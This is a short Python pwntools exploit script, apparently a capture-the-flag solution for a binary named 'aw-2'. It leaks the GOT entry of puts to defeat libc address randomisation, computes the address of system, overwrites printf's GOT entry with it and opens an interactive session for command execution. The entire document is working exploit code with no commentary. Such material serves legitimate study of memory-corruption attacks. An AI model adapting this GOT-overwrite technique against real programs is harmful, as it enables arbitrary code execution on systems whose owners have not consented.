#!/usr/bin/env python
from pwn import *

# set path for using system() and cat
env = { 'PATH' : '.:/bin:/usr/bin' }

p = process('./aw-2', env = env)

e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

addr_puts = e.symbols['puts']
print("PLT of puts %s" % hex(addr_puts))

addr_system = e.symbols['system']
print("PLT of system %s" % hex(addr_system))

offset = addr_system - addr_puts
print(offset)

print p.recvline()
print p.recvline()
p.sendline('8')

got_of_puts = p.elf.got['puts']
print("GOT of puts %s" % hex(got_of_puts))
print p.recvline()
p.sendline(hex(got_of_puts))

print p.recvline()
puts_got = p.recv(8)
print(puts_got)

libc_puts = u64(puts_got)
print(hex(libc_puts))

real_system = libc_puts + offset
print(hex(real_system))

print p.recvline()
print p.recvline()
p.sendline('8')

print p.recvline()
got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))
p.sendline(hex(got_of_printf))

payload = p64(real_system)
p.send(payload)

p.interactive()
